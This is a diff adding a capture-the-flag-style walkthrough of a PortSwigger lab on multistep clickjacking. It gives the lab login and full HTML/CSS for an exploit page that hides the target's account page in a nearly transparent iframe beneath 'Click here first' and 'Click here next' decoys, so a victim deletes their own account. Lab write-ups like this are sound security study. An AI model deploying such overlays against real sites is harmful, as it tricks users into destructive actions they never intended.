@@ -147,6 +147,51 @@
 **-> after submiting the feedback the image tries to load 0 as 0 isn't a valid image, the browser fires the image's error event to load(i.e, now the error event will load)** <br>
 ### The lab is solved ✅<br><br>
 
+## LAB-5: Multistep clickjacking
+<img width="1142" height="275" alt="image" src="https://github.com/user-attachments/assets/357d794a-5c00-4e79-ac5b-1292b331762e" /><br>
+### GOAL:
+**We need to construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions.** <br>
+**i.e, Need to construct two `div`elements and place it properly on the the "delete acc" and "confirmation dialog" button.** <br>
+### Soln:
+**-> Login with the credentials provided (wiener:peter) and we observe a delete option and after clicking it we also observe that a confirmation dialog box is being displayed.** <br>
+**-> go to exploit server and then we need to frame HTML and insert in the body**<br>
+```
+<style>
+		iframe {
+			position:absolute;
+			width:900px;
+			height:700px;
+			top: 10px;
+			left: 100px;
+			opacity: 0.1;
+			z-index:2;
+		}
+		div1 {
+			position:absolute;
+			top: 500px;
+			left: 130px;
+			z-index:1;
+		}
+		div2 {
+			position:absolute;
+			top: 295px;
+			left: 290px;
+			z-index:1;
+		}
+</style>
+	<div1>Click here first</div1>
+	<div2>Click here next</div2>
+	<iframe src="https://0a47000b03a2577782802f6d006600c7.web-security-academy.net/my-account">
+	</iframe>
+```
+**-> Make sure that the correct target URL is placed in the iframe, only then will the target page be displayed on the webpage**<br>
+**-> After injecting the HTML make sure that "Click here first and click here next" options and "delete option and confirmation dialog option" are aligned properly, if not adjust using "top,left" objects**<br>
+**-> The target webpage containing the “Delete” option is hidden underneath the “Click here first” option and then "confirmation dialog option" is hidden underneath "Click here next". When the user clicks the decoy, they are unknowingly clicking the hidden “Delete” option and again they "click on click here next" which is a confirmation dialog option and hence resulting in the account being deleted**<br>
+### The lab is solved ✅<br><br>
+
+
+
+
 
 
 
